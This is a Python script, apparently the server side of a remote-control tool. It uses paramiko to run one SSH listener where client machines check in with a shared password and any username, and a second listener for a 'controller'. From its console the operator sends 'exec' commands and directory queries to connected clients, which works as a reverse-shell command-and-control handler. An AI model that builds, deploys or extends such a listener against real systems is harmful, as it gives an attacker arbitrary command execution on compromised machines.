import socket
import paramiko
import threading
import sys
import threading

#script args
server_address = "0.0.0.0"
clients_port = int(sys.argv[1])
clients_password = sys.argv[2]
contr_port = int(sys.argv[3])
contr_username = "controller"
contr_password = sys.argv[4]
server_host_key = paramiko.RSAKey(filename="./ssh_server.key")

connected_clients = []

class ContrServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_auth_password(self, username, password):
        if username == contr_username and password == contr_password:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

#ssh server parameters defined in the class
class ClientServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        self.username = ""
    def check_auth_password(self, username, password):
        if password == clients_password:
            self.username = username
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

def get_client_path(client_no):
    _, _, client_ssh_channel = connected_clients[client_no]
    if not client_ssh_channel.closed:
        client_ssh_channel.send("getdir")
        return client_ssh_channel.recv(1024).decode('utf-8').strip()
    return ''

#ssh client handler
def client_handler(client_no):
    global connected_clients
    _, client_ssh_session, client_ssh_channel = connected_clients[client_no]
    while not client_ssh_channel.closed:
        command = input(f"{get_client_path(client_no)}:#> ").rstrip()
        if len(command):
            if command != "exit":
                client_ssh_channel.send("exec " + command)
                # print(client_ssh_channel.recv(1024).decode('utf-8'))
            else:
                # print("[*] Exiting")
                try:
                    client_ssh_channel.send("quit")
                    client_ssh_session.close()
                    connected_clients[client_no] = None
                    connected_clients = [c for c in connected_clients if c != None]
                except:
                    pass
                    # print("[!] Error closing SSH session")
                # print("[*] SSH session closed")

def contr_handler(contr_ssh_session, contr_ssh_channel):
    while not contr_ssh_channel.closed:
        command = contr_ssh_channel.recv(1024).decode('utf-8').split(" ")
        if command[0] == "getdir" and len(command[1]):
            try: contr_ssh_channel.send(get_client_path(int(command[1])))
            except IndexError:
                contr_ssh_channel.send("[SERVER] Invalid Client\n")
        elif command[0] == "quit":
            contr_ssh_session.close()
            return
        elif command[0] == "ping":
            contr_ssh_channel.send("[SERVER] pong")
        else:
            contr_ssh_channel.send("[SERVER] Invalid command")

def exit_client_sessions():
    for client in connected_clients[:]:
        try:
            if not client[2].closed:
                client[2].send("quit")
                client[1].close()
            connected_clients.remove(client)
            # print(f"[*] SSH session closed for {client[0]}")
        except:
            pass
            # print(f"[!] Error closing SSH session for {client[0]}")

def client():
    clients_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clients_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #ssh server bind and listen
    try:
        clients_socket.bind((server_address, clients_port))
    except:
        # print(f"[!] Bind Error for SSH Server using {server_address}:{clients_socket.getsockname()[1]}")
        sys.exit(1)
    # print(f"[*] Bind Success for SSH Server using {server_address}:{clients_socket.getsockname()[1]}")
    clients_socket.listen(100)
    # print("[*] Listening")

    #Keep ssh server active and accept incoming tcp connections
    while True:
        try:
            client_socket, addr = clients_socket.accept()
            # print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
            client_ssh_session = paramiko.Transport(client_socket)
            client_ssh_session.add_server_key(server_host_key)
            client_server = ClientServer()
            #start the ssh server and negotiate ssh params
            try:
                client_ssh_session.start_server(server=client_server)
            except paramiko.SSHException as err:
                client_ssh_session.close()
                # print("[!] SSH Parameters Negotiation Failed")
            # print("[*] SSH Parameters Negotiation Succeeded")
            #authenticate the client
            # print("[*] Authenticating")
            client_ssh_channel = client_ssh_session.accept(20)
            if client_ssh_channel == None or not client_ssh_channel.active:
                # print("[*] SSH Client Authentication Failure")
                client_ssh_session.close()
            else:
                # print(f"[*] SSH Client Authenticated with username: {client_server.username}")
                connected_clients.append((client_server.username, client_ssh_session, client_ssh_channel))
                # client_handler(0)
        except KeyboardInterrupt:
            # print("[*] Exiting Script")
            exit_client_sessions()
            # print("[*] ALL SSH session closed")
            sys.exit()
        except Exception as err:
            # print("[*] Caught Exception: ", str(err))
            # print("[*] Exiting Script")
            exit_client_sessions()
            # print("[*] ALL SSH session closed")
            sys.exit(1)

def controller():
    contrs_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    contrs_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #ssh server bind and listen
    try:
        contrs_socket.bind((server_address, contr_port))
    except:
        # print(f"[!] Bind Error for SSH Server using {server_address}:{contrs_socket.getsockname()[1]}")
        sys.exit(1)
    # print(f"[*] Bind Success for SSH Server using {server_address}:{contrs_socket.getsockname()[1]}")
    contrs_socket.listen(100)
    # print("[*] Listening")

    while True:
        try:
            contr_socket, addr = contrs_socket.accept()
            # print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
            contr_ssh_session = paramiko.Transport(contr_socket)
            contr_ssh_session.add_server_key(server_host_key)
            contr_server = ContrServer()
            #start the ssh server and negotiate ssh params
            try:
                contr_ssh_session.start_server(server=contr_server)
            except paramiko.SSHException as err:
                contr_ssh_session.close()
                # print("[!] SSH Parameters Negotiation Failed")
            # print("[*] SSH Parameters Negotiation Succeeded")
            #authenticate the controller
            # print("[*] Authenticating")
            contr_ssh_channel = contr_ssh_session.accept(20)
            if contr_ssh_channel == None or not contr_ssh_channel.active:
                # print("[*] SSH Controller Authentication Failure")
                contr_ssh_session.close()
            else:
                # print("[*] SSH Controller Authenticated")
                try:
                    contr_handler(contr_ssh_session, contr_ssh_channel)
                except OSError as err:
                    if str(err) != "Socket is closed": raise
                    # print("[*] Controller Disconnected")
        except KeyboardInterrupt:
            # print("[*] Exiting Script")
            try:
                contr_ssh_session.close()
            except:
                pass
                # print("[!] Error closing SSH session")
            # print("[*] SSH session closed")
            sys.exit()
        except Exception as err:
            print("[!] Caught Exception: ", type(err), str(err))
            # print("[*] Exiting Script")
            try:
                contr_ssh_session.close()
            except:
                pass
                # print("[!] Error closing SSH session")
            # print("[*] SSH session closed")
            sys.exit(1)

if __name__ == "__main__":
    client_thread = threading.Thread(target = client, daemon = True)
    client_thread.start()
    contr_thread = threading.Thread(target = controller)
    contr_thread.start()
    contr_thread.join()